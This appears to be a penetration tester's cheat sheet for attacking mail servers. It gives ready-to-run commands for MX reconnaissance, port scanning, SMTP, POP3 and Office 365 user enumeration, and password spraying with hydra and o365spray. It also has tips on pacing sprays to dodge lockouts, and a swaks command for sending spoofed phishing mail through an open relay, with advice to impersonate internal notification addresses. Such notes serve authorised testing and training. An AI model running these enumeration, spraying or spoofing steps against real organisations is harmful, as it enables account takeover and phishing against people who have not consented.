# Attacking Email Services

MX record reveals provider → cloud (O365/GSuite/Zoho) or custom. Custom = standard protocol attacks. Cloud = provider-specific tooling.

Identify mail server and resolve its IP:

```bash
host -t MX <DOMAIN>
dig mx <DOMAIN> | grep "MX" | grep -v ";"
host -t A <MAIL_HOST>
```

Scan all mail ports:

```bash
sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <TARGET>
```

## User Enumeration

VRFY/EXPN/RCPT TO all enumerate valid users — try all three, servers disable them selectively.

Manual SMTP enum via telnet:

```bash
telnet <TARGET> 25
VRFY <USER>
EXPN <USER_OR_LIST>
# or: MAIL FROM:test@test.com → RCPT TO:<USER> → 250 = exists, 550 = doesn't
```

POP3 user enum:

```bash
telnet <TARGET> 110
USER <USER>
# +OK = exists, -ERR = doesn't
```

Automated — RCPT mode is most reliable, add -D if server requires full email address:

```bash
smtp-user-enum -M RCPT -U <WORDLIST> -D <DOMAIN> -t <TARGET>
```

O365 — validate domain first, then enum:

```bash
python3 o365spray.py --validate --domain <DOMAIN>
python3 o365spray.py --enum -U <USERLIST> --domain <DOMAIN>
```

## Password Attacks

Hydra against POP3/IMAP/SMTP — spray one password across user list:

```bash
hydra -L <USERLIST> -p '<PASS>' -f <TARGET> pop3
```

O365 spray — `--count 1` = one password per round, `--lockout 1` = 1 min wait between rounds:

```bash
python3 o365spray.py --spray -U <USERLIST> -p '<PASS>' --count 1 --lockout 1 --domain <DOMAIN>
```

> [!warning] O365/Gmail/Okta block standard Hydra. Use o365spray for O365, CredKing for Gmail/Okta. These tools break when providers update auth flows — verify they're current before relying on them.

## Open Relay Abuse

Check for open relay — server is an open relay (14/16 tests) = confirmed:

```bash
nmap -p25 -Pn --script smtp-open-relay <TARGET>
```

Send phishing email through the relay as any address:

```bash
swaks --from <SPOOFED_FROM> --to <TARGET_USER> --header 'Subject: <SUBJECT>' --body '<BODY_WITH_LINK>' --server <TARGET>
```

> [!tip] Open relay = send as any address including internal ones. Spoof a known internal notification address → high credibility phishing. Always check MX record first — if it's cloud, open relay on a custom box still works for internal-looking spoofs.